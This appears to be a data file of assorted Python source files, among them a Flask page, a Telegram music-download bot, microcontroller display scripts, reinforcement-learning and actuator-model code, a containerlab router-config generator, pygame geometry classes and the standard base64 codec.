    "from flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef hello_world():\n    return \"\"\"\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"https://sudor2spr.github.io/Documentation/assets/style.css\">\n    <titleSudoR2spr Repository</title>\n\t<link rel=\"icon\" type=\"image/x-icon\" href=\"https://raw.githubusercontent.com/SudoR2spr/SudoR2spr/main/assets/angel-op/Angel-ji.png\">\n\n</head>\n\n<body>\n    <div class=\"container\" style=\"bg-dark text-red text-center py-3 mt-5\">\n        <a href=\"https://telegram.me/teraboxdownloader_file\" class=\"card\">\n            <p>\n               \u2591\u2588\u2580\u2580\u2584\u2591\u2592\u2588\u2584\u2591\u2592\u2588\u2591\u2592\u2588\u2580\u2580\u2588\u2591\u2592\u2588\u2580\u2580\u2580\u2591\u2592\u2588\u2591\u2591\u2591<br>\n               \u2592\u2588\u2584\u2584\u2588\u2591\u2592\u2588\u2592\u2588\u2592\u2588\u2591\u2592\u2588\u2591\u2584\u2584\u2591\u2592\u2588\u2580\u2580\u2580\u2591\u2592\u2588\u2591\u2591\u2591<br>\n               \u2592\u2588\u2591\u2592\u2588\u2591\u2592\u2588\u2591\u2591\u2580\u2588\u2591\u2592\u2588\u2584\u2584\u2580\u2591\u2592\u2588\u2584\u2584\u2584\u2591\u2592\u2588\u2584\u2584\u2588<br>\n                                             <br>\n\n                <b>v2.0.0</b>\n            </p>\n        </a>\n    </div>\n\t<br></br><br></br><br></br>\n\t<footer class=\"bg-dark text-white text-center py-3 mt-5\">\n\t<center><img loading=\"lazy\" class=\"object-none object-center\" src=\"https://graph.org/file/548b8b73c35af202bfdac.png\" width=\"60\" height=\"60\">\n        Powered By JSRBots \n\t\t<img loading=\"lazy\" class=\"object-none object-center\" src=\"https://graph.org/file/548b8b73c35af202bfdac.png\" width=\"60\" height=\"60\">\n\t\t<div class=\"footer__copyright\">\n            <p class=\"footer__copyright-info\">\n                \u00a9 2024 Video Downloader. All rights reserved.\n            </p>\n        </div>\n    </footer></center>\n</body>\n\n</html>\n\"\"\"\n\n\nif __name__ == \"__main__\":\n    app.run()\n",
    "import logging\r\nimport requests\r\nimport yt_dlp\r\nimport asyncio\r\nfrom telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update\r\nfrom telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler\r\nimport os\r\n\r\n# Replace with your bot's API token\r\nAPI_TOKEN = 'YOUR_BOT_FATHER_TOKEN'\r\n\r\n# YouTube Data API key\r\nYOUTUBE_API_KEY = 'YOUTUBE_API_KEY'\r\n\r\n# Configure logging\r\nlogging.basicConfig(\r\n    format=\"%(asctime)s - %(name)s - %(levelname)s - %(message)s\",\r\n    level=logging.INFO,\r\n)\r\nlogger = logging.getLogger(__name__)\r\n\r\n# Ensure the downloads folder exists\r\nos.makedirs(\"downloads\", exist_ok=True)\r\n\r\n# Start command\r\nasync def start(update: Update, context) -> None:\r\n    await update.message.reply_text(\r\n        \"Hello! Welcome to MelodyFetch, I can help you search for music and download them. Send me the song name!\"\r\n    )\r\n\r\n# Search for music using YouTube Data API\r\ndef search_music(query: str) -> list:\r\n    api_url = f\"https://www.googleapis.com/youtube/v3/search?part=snippet&q={query}&type=video&key={YOUTUBE_API_KEY}\"\r\n    response = requests.get(api_url)\r\n    data = response.json()\r\n\r\n    results = []\r\n    for item in data.get(\"items\", [])[:5]:  # Limit to top 5 results\r\n        title = item[\"snippet\"][\"title\"]\r\n        video_id = item[\"id\"][\"videoId\"]\r\n        video_url = f\"https://www.youtube.com/watch?v={video_id}\"\r\n        results.append({\"title\": title, \"url\": video_url, \"video_id\": video_id})\r\n\r\n    return results\r\n\r\n# Create inline buttons with music results\r\ndef create_buttons(results):\r\n    keyboard = [\r\n        [InlineKeyboardButton(result[\"title\"], callback_data=result[\"video_id\"])]\r\n        for result in results\r\n    ]\r\n    return InlineKeyboardMarkup(keyboard)\r\n\r\n# Handle the user's message and search for music\r\nasync def handle_message(update: Update, context) -> None:\r\n    query = update.message.text\r\n    await update.message.reply_text(f\"Searching for: {query}\")\r\n\r\n    # Get search results\r\n    results = search_music(query)\r\n\r\n    if results:\r\n        message = \"Here are the top results:\"\r\n        await update.message.reply_text(message, reply_markup=create_buttons(results))\r\n    else:\r\n        await update.message.reply_text(\"No results found. Try a different query.\")\r\n\r\n# A function to download the song asynchronously using yt-dlp\r\nasync def download_song(video_url, video_id):\r\n    ydl_opts = {\r\n        \"format\": \"bestaudio/best\",  # Downloads the best available audio format\r\n        \"outtmpl\": f\"downloads/{video_id}.%(ext)s\",  # Saves the audio in a folder called downloads\r\n        \"postprocessors\": [],  # Do not use postprocessors like ffmpeg\r\n    }\r\n\r\n    loop = asyncio.get_event_loop()\r\n    with yt_dlp.YoutubeDL(ydl_opts) as ydl:\r\n        info_dict = await loop.run_in_executor(None, ydl.extract_info, video_url)\r\n        return f\"downloads/{info_dict['id']}.webm\"  # Return path to downloaded audio file\r\n\r\n# Handle the button press and download the song\r\nasync def button_handler(update: Update, context) -> None:\r\n    query = update.callback_query\r\n    video_id = query.data\r\n    video_url = f\"https://www.youtube.com/watch?v={video_id}\"\r\n\r\n    await query.answer()\r\n    await query.edit_message_text(text=\"Downloading music... Please wait a moment.\")\r\n\r\n    try:\r\n        # Start the download\r\n        song_path = await download_song(video_url, video_id)\r\n        \r\n        # Send the downloaded song back\r\n        await query.message.reply_audio(open(song_path, \"rb\"))\r\n        os.remove(song_path)\r\n    except Exception as e:\r\n        await query.message.reply_text(f\"Error downloading music: {e}\")\r\n\r\n# Main function to set up the bot\r\ndef main() -> None:\r\n    # Create the application\r\n    application = Application.builder().token(API_TOKEN).build()\r\n\r\n    # Add command handler for /start\r\n    application.add_handler(CommandHandler(\"start\", start))\r\n\r\n    # Add handler for regular text messages\r\n    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))\r\n\r\n    # Add handler for inline button press (search results)\r\n    application.add_handler(CallbackQueryHandler(button_handler))\r\n\r\n    # Start the bot\r\n    application.run_polling()\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "\"\"\"\n  test_prox_int.py test example for the PT6302 VFD Driver.\n\n  - Focus: Showing integer value on a panel.\n  - VFD Model: Proximus TV/Belgacom TV  Vaccum Fluorescent Display\n\nThe MIT License (MIT)\nCopyright (c) 2024 Dominique Meurisse, support@mchobby.be, shop.mchobby.be\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n\"\"\"\n\nfrom vfd_proximus import *\nfrom machine import Pin\nimport time\n\nd = VFD_Proximus( sck_pin=Pin.board.GP16, sdata_pin=Pin.board.GP13, cs_pin=Pin.board.GP14, reset_pin=Pin.board.GP18 )\nd.print(\"Show float\") # Can add a position from 1 to 12 in second position!\n\n\nVALUES =  [1.25,15.2,32,133.78,73.1,5.2]\n\nfor value in VALUES:\n\td.center.float( value )\n\td.update()\n\ttime.sleep(1)\nd.center.clear()\nd.update()\n\nfor value in VALUES:\n\td.left.float( value )\n\td.update()\n\ttime.sleep(1)\nd.left.clear()\nd.update()\n\nd.clrscr()\nd.print('Done!')\n",
    "#https://github.com/mrglennjones/presto-spotify\n\nimport gc\nimport sdcard\nimport machine\nimport uos\nimport jpegdec\nfrom presto import Presto\nimport utime as time\nfrom time import sleep\nimport network\nimport secrets\nimport json\nimport urequests  # Ensure this is included\n\n# Initialize Presto with high brightness\npresto = Presto(ambient_light=False)  # Disable ambient light sensor for consistent brightness\npresto.set_backlight(1.0)  # Maximum brightness\ndisplay = presto.display\nWIDTH, HEIGHT = display.get_bounds()\njpeg = jpegdec.JPEG(display)\n\n# File paths\nTOKEN_FILE = \"/sd/token.json\"\nIMAGE_FILE = \"/sd/nowplaying.jpg\"\n\n# Spotify credentials from secrets.py\nCLIENT_ID = secrets.CLIENT_ID\nCLIENT_SECRET = secrets.CLIENT_SECRET\nREDIRECT_URI = secrets.REDIRECT_URI\nACCESS_TOKEN = None  # Will be set dynamically\nWIFI_SSID = secrets.WIFI_SSID\nWIFI_PASSWORD = secrets.WIFI_PASSWORD\n\n# Cache for the last song ID\nlast_song_id = None\n\n\ndef connect_to_wifi():\n    \"\"\"\n    Connects to Wi-Fi using credentials from secrets.py.\n    \"\"\"\n    wlan = network.WLAN(network.STA_IF)\n    wlan.active(True)\n    display_text_on_screen(\"Connecting to Wi-Fi...\")\n    if not wlan.isconnected():\n        wlan.connect(WIFI_SSID, WIFI_PASSWORD)\n        while not wlan.isconnected():\n            sleep(1)\n            display_text_on_screen(\"Connecting to Wi-Fi...\")\n    ip_address = wlan.ifconfig()[0]\n    display_text_on_screen(f\"Wi-Fi Connected\\nIP: {ip_address}\")\n    print(f\"Connected to Wi-Fi! IP Address: {ip_address}\")\n\n\ndef mount_sd():\n    \"\"\"\n    Mounts the SD card to the '/sd' directory.\n    \"\"\"\n    try:\n        display_text_on_screen(\"Initializing SD Card...\")\n        sd_spi = machine.SPI(0,\n                             sck=machine.Pin(34, machine.Pin.OUT),\n                             mosi=machine.Pin(35, machine.Pin.OUT),\n                             miso=machine.Pin(36, machine.Pin.OUT))\n        sd = sdcard.SDCard(sd_spi, machine.Pin(39))\n        uos.mount(sd, \"/sd\")\n        display_text_on_screen(\"SD Card Mounted\")\n        print(\"SD card mounted successfully!\")\n    except Exception as e:\n        display_text_on_screen(\"SD Card Mount Failed\")\n        print(f\"Error mounting SD card: {e}\")\n\n\ndef save_token(token_data):\n    \"\"\"\n    Saves the access token, refresh token, and their expiration time to a file on the SD card.\n    \"\"\"\n    token_data['expires_at'] = int(time.time()) + token_data['expires_in']\n    try:\n        with open(TOKEN_FILE, \"w\") as f:\n            json.dump(token_data, f)\n        print(f\"Token data saved to {TOKEN_FILE}\")\n    except OSError as e:\n        print(f\"Error saving token to SD card: {e}\")\n\n\ndef load_token():\n    \"\"\"\n    Loads the access token and its expiration time from a file on the SD card.\n    \"\"\"\n    try:\n        with open(TOKEN_FILE, \"r\") as f:\n            token_data = json.load(f)\n            if token_data['expires_at'] > time.time():\n                print(\"Loaded valid token from SD card.\")\n                return token_data\n            else:\n                print(\"Token has expired.\")\n                return None\n    except OSError as e:\n        print(f\"Error loading token from SD card: {e}\")\n        return None\n\n\ndef refresh_token():\n    \"\"\"\n    Uses the refresh token to request a new access token.\n    \"\"\"\n    global ACCESS_TOKEN\n    try:\n        with open(TOKEN_FILE, \"r\") as f:\n            token_data = json.load(f)\n\n        if \"refresh_token\" not in token_data:\n            raise ValueError(\"Refresh token not found in token data.\")\n\n        refresh_token = token_data[\"refresh_token\"]\n\n        token_url = \"https://accounts.spotify.com/api/token\"\n        headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        data = (\n            f\"grant_type=refresh_token\"\n            f\"&refresh_token={refresh_token}\"\n            f\"&client_id={CLIENT_ID}\"\n            f\"&client_secret={CLIENT_SECRET}\"\n        )\n\n        response = urequests.post(token_url, headers=headers, data=data)\n\n        if response.status_code == 200:\n            new_token_data = response.json()\n            print(f\"New Token Data: {new_token_data}\")\n\n            # Update and save the new access token and expiration time\n            token_data['access_token'] = new_token_data['access_token']\n            token_data['expires_in'] = new_token_data.get('expires_in', 3600)\n            token_data['expires_at'] = int(time.time()) + token_data['expires_in']\n\n            # Save any new refresh token (if provided)\n            if \"refresh_token\" in new_token_data:\n                token_data[\"refresh_token\"] = new_token_data[\"refresh_token\"]\n\n            save_token(token_data)\n            ACCESS_TOKEN = new_token_data['access_token']\n            print(\"Access token refreshed successfully!\")\n        else:\n            print(f\"Failed to refresh token: {response.status_code}\")\n            print(response.text)\n            raise ValueError(\"Failed to refresh access token.\")\n    except Exception as e:\n        print(f\"Error refreshing token: {e}\")\n        raise\n",
    "from __future__ import annotations\n\nimport torch\n\nfrom rsl_rl.utils import split_and_pad_trajectories\n\nfrom .rollout_storage import RolloutStorage\n\nclass ASERolloutStorage(RolloutStorage):\n    #\u4eceRolloutStorage\u4e2d\u7ee7\u627f\u7684\u65b0\u7c7b\uff0c\u589e\u52a0\u4e86ASE latent\u7684\u6570\u636e\n    class Transition(RolloutStorage.Transition):\n        def __init__(self):\n            super().__init__()\n            self.ase_latent = None\n            self.amp_observations = None\n    \n    def __init__(self, num_envs, num_transitions_per_env, obs_shape, privileged_obs_shape, actions_shape, latent_shape = 64,device=\"cpu\"):\n        super().__init__(num_envs, num_transitions_per_env, obs_shape, privileged_obs_shape, actions_shape, device)\n        #\u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u5c5e\u6027ase_latent\uff0c\u7528\u4e8e\u5b58\u50a8ASE latent\n        self.ase_latent = torch.zeros(num_transitions_per_env, num_envs,latent_shape, device=self.device)\n\n    def add_transitions(self, transition: Transition):\n        # \u5982\u679c\u5f53\u524d\u6b65\u9aa4\u6570\u5df2\u7ecf\u8d85\u8fc7\u4e86\u6bcf\u4e2a\u73af\u5883\u7684\u8fc7\u6e21\u6570\uff0c\u5219\u629b\u51fa\u5f02\u5e38\n        if self.step >= self.num_transitions_per_env:\n            raise AssertionError(\"Rollout buffer overflow\")\n\n        # \u5c06transition\u4e2d\u7684\u89c2\u6d4b\u503c\u590d\u5236\u5230self.observations\u5bf9\u5e94\u6b65\u9aa4\u7684\u4f4d\u7f6e\n        self.observations[self.step].copy_(transition.observations)\n\n        # \u5982\u679cself.privileged_observations\u4e0d\u4e3a\u7a7a\uff0c\u5219\u5c06transition\u4e2d\u7684critic\u89c2\u6d4b\u503c\u590d\u5236\u5230self.privileged_observations\u5bf9\u5e94\u6b65\u9aa4\u7684\u4f4d\u7f6e\n        if self.privileged_observations is not None:\n            self.privileged_observations[self.step].copy_(transition.critic_observations)\n\n        # \u5c06transition\u4e2d\u7684\u52a8\u4f5c\u590d\u5236\u5230self.actions\u5bf9\u5e94\u6b65\u9aa4\u7684\u4f4d\u7f6e\n        self.actions[self.step].copy_(transition.actions)\n\n        # \u5c06transition\u4e2d\u7684\u5956\u52b1\u590d\u5236\u5230self.rewards\u5bf9\u5e94\u6b65\u9aa4\u7684\u4f4d\u7f6e\uff0c\u5e76\u8c03\u6574\u7ef4\u5ea6\n        self.rewards[self.step].copy_(transition.rewards.view(-1, 1))\n\n        # \u5c06transition\u4e2d\u7684\u7ed3\u675f\u72b6\u6001\u590d\u5236\u5230self.dones\u5bf9\u5e94\u6b65\u9aa4\u7684\u4f4d\u7f6e\uff0c\u5e76\u8c03\u6574\u7ef4\u5ea6\n        self.dones[self.step].copy_(transition.dones.view(-1, 1))\n\n        # \u5c06transition\u4e2d\u7684\u503c\u590d\u5236\u5230self.values\u5bf9\u5e94\u6b65\u9aa4\u7684\u4f4d\u7f6e\n        self.values[self.step].copy_(transition.values)\n\n        # \u5c06transition\u4e2d\u7684\u52a8\u4f5c\u5bf9\u6570\u6982\u7387\u590d\u5236\u5230self.actions_log_prob\u5bf9\u5e94\u6b65\u9aa4\u7684\u4f4d\u7f6e\uff0c\u5e76\u8c03\u6574\u7ef4\u5ea6\n        self.actions_log_prob[self.step].copy_(transition.actions_log_prob.view(-1, 1))\n\n        # \u5c06transition\u4e2d\u7684\u52a8\u4f5c\u5747\u503c\u590d\u5236\u5230self.mu\u5bf9\u5e94\u6b65\u9aa4\u7684\u4f4d\u7f6e\n        self.mu[self.step].copy_(transition.action_mean)\n\n        # \u5c06transition\u4e2d\u7684\u52a8\u4f5c\u6807\u51c6\u5dee\u590d\u5236\u5230self.sigma\u5bf9\u5e94\u6b65\u9aa4\u7684\u4f4d\u7f6e\n        self.sigma[self.step].copy_(transition.action_sigma)\n\n\n        self.ase_latent[self.step].copy_(transition.ase_latent)\n\n        # \u4fdd\u5b58transition\u4e2d\u7684\u9690\u85cf\u72b6\u6001\n        self._save_hidden_states(transition.hidden_states)\n\n        # \u589e\u52a0\u6b65\u9aa4\u6570\n        self.step += 1\n        \n    def mini_batch_generator(self, num_mini_batches, num_epochs=8):\n        # \u8ba1\u7b97\u6bcf\u4e2a\u5c0f\u6279\u91cf\u7684\u5927\u5c0f\n        batch_size = self.num_envs * self.num_transitions_per_env\n        mini_batch_size = batch_size // num_mini_batches\n\n        # \u751f\u6210\u968f\u673a\u7d22\u5f15\n        indices = torch.randperm(num_mini_batches * mini_batch_size, requires_grad=False, device=self.device)\n\n        # \u5c55\u5f00\u89c2\u6d4b\u503c\n        observations = self.observations.flatten(0, 1)\n\n        # \u5982\u679c\u5b58\u5728\u7279\u6743\u89c2\u6d4b\u503c\uff0c\u5219\u4f7f\u7528\u7279\u6743\u89c2\u6d4b\u503c\uff0c\u5426\u5219\u4f7f\u7528\u666e\u901a\u89c2\u6d4b\u503c\n        if self.privileged_observations is not None:\n            critic_observations = self.privileged_observations.flatten(0, 1)\n        else:\n            # \u4f7f\u7528\u666e\u901a\u89c2\u6d4b\u503c\u4f5c\u4e3acritic\u89c2\u6d4b\u503c\n            critic_observations = observations\n\n        # \u5c55\u5f00\u52a8\u4f5c\u3001\u503c\u3001\u56de\u62a5\u3001\u65e7\u52a8\u4f5c\u5bf9\u6570\u6982\u7387\u3001\u4f18\u52bf\u3001\u65e7\u5747\u503c\u548c\u65e7\u6807\u51c6\u5dee\n        actions = self.actions.flatten(0, 1)\n        values = self.values.flatten(0, 1)\n        returns = self.returns.flatten(0, 1)\n        old_actions_log_prob = self.actions_log_prob.flatten(0, 1)\n        advantages = self.advantages.flatten(0, 1)\n        old_mu = self.mu.flatten(0, 1)\n        old_sigma = self.sigma.flatten(0, 1)\n        ase_latent = self.ase_latent.flatten(0, 1)\n\n        # \u8bad\u7ec3\u591a\u8f6e\n        for epoch in range(num_epochs):\n            # \u5206\u5272\u6570\u636e\u4e3a\u5c0f\u6279\u91cf\n            for i in range(num_mini_batches):\n                start = i * mini_batch_size\n                end = (i + 1) * mini_batch_size\n                batch_idx = indices[start:end]\n\n                # \u63d0\u53d6\u5f53\u524d\u5c0f\u6279\u91cf\u7684\u6570\u636e\n                obs_batch = observations[batch_idx]\n                critic_observations_batch = critic_observations[batch_idx]\n                actions_batch = actions[batch_idx]\n                target_values_batch = values[batch_idx]\n                returns_batch = returns[batch_idx]\n                old_actions_log_prob_batch = old_actions_log_prob[batch_idx]\n                advantages_batch = advantages[batch_idx]\n                old_mu_batch = old_mu[batch_idx]\n                old_sigma_batch = old_sigma[batch_idx]\n                ase_latent_batch = ase_latent[batch_idx]\n\n                # \u4ea7\u51fa\u5f53\u524d\u5c0f\u6279\u91cf\u7684\u6570\u636e\uff0c\u4ee5\u53ca\u4e00\u4e9b\u989d\u5916\u7684\u5360\u4f4d\u7b26\n                yield obs_batch, critic_observations_batch, actions_batch, target_values_batch, advantages_batch, returns_batch, old_actions_log_prob_batch, old_mu_batch, old_sigma_batch,ase_latent_batch, (\n                    None,\n                    None,\n                ), None",
    "import os\nimport yaml\n\nuser_directory = input('Enter directory for XRd config to change: ')\nclab_directory = os.path.abspath(os.path.join(user_directory, '..', '..'))\n\nnode_name = os.path.basename(os.path.normpath(user_directory))\n\nfor filename in os.listdir(clab_directory):\n    if filename.endswith('.clab.yml'):\n        with open(os.path.join(clab_directory, filename), 'r') as file:\n            clab_topology = yaml.safe_load(file)\nclab_nodes = [{\"name\": key, **value} for key, value in clab_topology[\"topology\"][\"nodes\"].items()]\n\nfor node in clab_nodes:\n    if node['name'] == node_name:\n        mgmt_ip = node['mgmt-ipv4']\n\nclab_config = f\"\"\"hostname {node_name}\nusername clab\n group root-lr\n group cisco-support\n secret 10 $6$KIdSE0Je5Yu/7E0.$OJR/sA.gFWARhit.mnQLH0sKeAde8.KgNZM5yz8i/qKgClEQk9PJ0c6Ltq/tpr3.3AzxhS37b6.UbomuaVYLg.\n!\nline default\n transport input ssh\n exec-timeout 0 0\n!\nvrf clab-mgmt\n description Containerlab management VRF (DO NOT DELETE)\n address-family ipv4 unicast\n !\n!\ninterface MgmtEth0/RP0/CPU0/0\n vrf clab-mgmt\n ipv4 address {mgmt_ip} 255.255.255.0\n no shutdown\n!\nrouter static\n vrf clab-mgmt\n  address-family ipv4 unicast\n   0.0.0.0/0 10.200.255.1\n  !\n !\n!\nssh server v2\nssh server vrf clab-mgmt\n!\nhttp client vrf clab-mgmt\nhttp client source-interface ipv4 MgmtEth0/RP0/CPU0/0\n!\n\"\"\"\n\nfor filename in os.listdir(user_directory):\n    file_path = os.path.join(user_directory, filename)\n\n    with open(file_path, 'r') as file:\n        file_contents = file.read()\n\n    if 'vrf clab-mgmt' not in file_contents:\n        with open(file_path, 'w') as file:\n            gigabit_interfaces = []\n            for line in file_contents.splitlines():\n                if 'interface GigabitEthernet0/0/0' in line:\n                    gigabit_interfaces.append(line.strip().split('.')[0])\n\n                if line.strip() == 'end':\n                    file.write(clab_config)\n                    continue\n\n                file.write(line + '\\n')\n\n            for interface_line in set(gigabit_interfaces):\n                file.write(interface_line + '\\n')\n                file.write(' no shutdown' + '\\n')\n\n            file.write('end\\n')\n",
    "import torch\nfrom torch.utils.data import DataLoader, random_split\nfrom dataset import JointDataset, read_bags\nimport os\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nthis_file_dir = os.path.dirname(os.path.realpath(__file__))\njit_dir = os.path.join(this_file_dir, '..', 'logs')\njit_file = os.path.join(jit_dir, 'actuator_net.pt')\n\n# load jit\nnet = torch.jit.load(jit_file)\n\nbag_dir = os.path.join(this_file_dir, '..', 'bags')\nbag_file = 'go2_real_data.bag'\nXs, Ys = read_bags(bag_file, bag_dir=bag_dir, dt=0.01)\ndata_set = JointDataset(Xs, Ys)\n\nYs_hat = np.zeros_like(Ys)\n\nnet.eval()\nwith torch.no_grad():\n    for i in range(len(data_set)):\n        X, Y = data_set[i]\n        Y_hat = net(X)\n        Ys_hat[i] = Y_hat.item()\n        \nvis_len = 12000\nvis_jnt = 3\nplt.figure()\nplt.plot(Ys[vis_jnt:vis_len:12], label='ground truth')\nplt.plot(Ys_hat[vis_jnt:vis_len:12], label='prediction')\nplt.legend()\nplt.show()\n\n\n\n\n\n# num_train = int(0.7 * len(data_set))\n# num_val = int(0.15 * len(data_set))\n# num_test = len(data_set) - num_train - num_val\n\n# train_set, val_set, test_set = random_split(data_set, [num_train, num_val, num_test])\n# batch_size = 128\n# train_loader = DataLoader(train_set, batch_size=batch_size, shuffle=True)\n# val_loader = DataLoader(val_set, batch_size=batch_size, shuffle=True)\n# test_loader = DataLoader(test_set, batch_size=batch_size, shuffle=True)\n\n# # plot the prediction and ground truth in test set\n# import matplotlib.pyplot as plt\n# import numpy as np\n\n# net.eval()\n# with torch.no_grad():\n#     for i, (X, Y) in enumerate(test_loader):\n#         Y_hat = net(X)\n#         break\n\n# Y = Y.cpu().numpy()\n# Y_hat = Y_hat.cpu().numpy()\n\n# plt.figure()\n# plt.plot(Y, label='ground truth')\n# plt.plot(Y_hat, label='prediction')\n# plt.legend()\n\n# plt.show()\n",
    "\"\"\"A python module containing math classes for a physical simulation\n\nThis module contains:\n- class `CoordSys`: A dynamic coordinate system for the pygame screen\n- class `Vector`: A two-dimensional vector with enhanced functionality\n\"\"\"\n\nfrom __future__ import annotations\nfrom typing import Tuple, Any, Iterator\nfrom collections.abc import Sequence\nimport pygame\n\n\nclass CoordSys:\n    \"\"\"Apply a dynamic coordinate system to a pygame screen\n\n    The coordinate system features:\n    - transformation of coordinates\n    - transformation of lengths\n    - borders to keep a constant aspect ratio\n    \"\"\"\n\n    def __init__(self, display: pygame.Surface) -> None:\n        self.display = display\n        self.x_tot: int = 10000\n        self.y_tot: int = 10000\n\n    def __repr__(self) -> str:\n        return f\"<Coordinate System ([0, {self.x_tot}], [0, {self.y_tot}])>\"\n\n    def _update_dimensions(self) -> Tuple[float, float, float, float, float]:\n        \"\"\"Calculate the scale, offset and dimension for the screen\n\n        scale factor: tells how many screen pixels a single step in the coordinate system is\n        display width: the width of the pygame display\n        display height: the height of the pygame display\n        x_offset: compensates for different aspect ratios, 0 if aligned\n        y_offset: compensates for different aspect ratios, 0 if alligned\n\n        Returns\n        -------\n        `Tuple[float, float, float, float, float]`\n            The scale factor, display width, display height, x offset and y offset values\n        \"\"\"\n        # Calculate the new scale factor\n        scale: float = min(\n            self.display.get_width() / self.x_tot,\n            self.display.get_height() / self.y_tot,\n        )\n\n        return (\n            scale,  # scale factor\n            self.display.get_width(),  # display width\n            self.display.get_height(),  # display height\n            (self.display.get_width() - self.x_tot * scale) / 2,  # x offset\n            (self.display.get_height() - self.y_tot * scale) / 2,  # y offset\n        )\n\n    def distance(self, distance: float) -> float:\n        \"\"\"Convert a distance value from the coordinate syste to the\n        value in pixels on the pygame screen\n\n        Parametres\n        ----------\n        `distance` : `float`\n            The original distance in the coordinate system\n\n        Returns\n        -------\n        `float`\n            The new distance in pixels on the screen\n        \"\"\"\n        return distance * self._update_dimensions()[0]\n\n    def coord(self, x: float, y: float) -> Tuple[float, float]:\n        \"\"\"Convert a coordinate from the coordinate system into a\n        coordinate in pixels on the pygame screen\n\n        Parametres\n        ----------\n        `x` : `float`\n            The x-coordinate of the original coordinate\n        `y` : `float`\n            The y-coordinate of the original coordinate\n\n        Returns\n        -------\n        `Tuple[float, float]`\n            The new coordinate in pixels on the screen\n        \"\"\"\n        scale, _, height, x_offset, y_offset = self._update_dimensions()\n        return (\n            x * scale + x_offset,\n            height - y_offset - (y * scale),\n        )\n\n    def draw_borders(self) -> None:\n        \"\"\"Draw borders onto the screen to compensate for different aspect ratios\n        \n        Draw a black border at the edges of the display to ensure the \\\\\n        visible part always has the same aspect ratio\n        \"\"\"\n        _, width, height, x_offset, y_offset = self._update_dimensions()\n\n        if x_offset:\n            # Draw the borders to the right and left\n            pygame.draw.rect(\n                self.display,\n                (0, 0, 0),\n                (0.0, 0.0, x_offset, height),\n            )\n\n            pygame.draw.rect(\n                self.display,\n                (0, 0, 0),\n                (width - x_offset, 0.0, x_offset, height),\n            )\n\n        else:\n            # Draw the borders to the top and bottom\n            pygame.draw.rect(\n                self.display,\n                (0, 0, 0),\n                (0.0, 0.0, width, y_offset),\n            )\n\n            pygame.draw.rect(\n                self.display,\n                (0, 0, 0),\n                (0.0, height - y_offset, width, y_offset),\n            )\n\n\nclass Vector(Sequence[float]):\n    \"\"\"A two-dimensional vector\n\n    The vector features:\n    - an x and y coordinate\n    - addition and subtraction with another vector\n    - multiplication and division with a scalar\n    - magnitude property to calculate\n    \"\"\"\n\n    def __init__(self, x: float, y: float) -> None:\n        self.x: float = x\n        self.y: float = y\n\n    def __repr__(self) -> str:\n        return f\"<Vector ({self.x}, {self.y})>\"\n\n    def __len__(self) -> int:\n        return 2\n\n    # Since this vector is two-dimensional, there is no need for it to be sliceable. I added\n    # the `# type: ignore` to supress an error message created by the Mypy type checker\n    def __getitem_",
    "\"\"\"Python 'base64_codec' Codec - base64 content transfer encoding.\n\nThis codec de/encodes from bytes to bytes.\n\nWritten by Marc-Andre Lemburg (mal@lemburg.com).\n\"\"\"\n\nimport codecs\nimport base64\n\n### Codec APIs\n\ndef base64_encode(input, errors='strict'):\n    assert errors == 'strict'\n    return (base64.encodebytes(input), len(input))\n\ndef base64_decode(input, errors='strict'):\n    assert errors == 'strict'\n    return (base64.decodebytes(input), len(input))\n\nclass Codec(codecs.Codec):\n    def encode(self, input, errors='strict'):\n        return base64_encode(input, errors)\n    def decode(self, input, errors='strict'):\n        return base64_decode(input, errors)\n\nclass IncrementalEncoder(codecs.IncrementalEncoder):\n    def encode(self, input, final=False):\n        assert self.errors == 'strict'\n        return base64.encodebytes(input)\n\nclass IncrementalDecoder(codecs.IncrementalDecoder):\n    def decode(self, input, final=False):\n        assert self.errors == 'strict'\n        return base64.decodebytes(input)\n\nclass StreamWriter(Codec, codecs.StreamWriter):\n    charbuffertype = bytes\n\nclass StreamReader(Codec, codecs.StreamReader):\n    charbuffertype = bytes\n\n### encodings module API\n\ndef getregentry():\n    return codecs.CodecInfo(\n        name='base64',\n        encode=base64_encode,\n        decode=base64_decode,\n        incrementalencoder=IncrementalEncoder,\n        incrementaldecoder=IncrementalDecoder,\n        streamwriter=StreamWriter,\n        streamreader=StreamReader,\n        _is_text_encoding=False,\n    )\n",
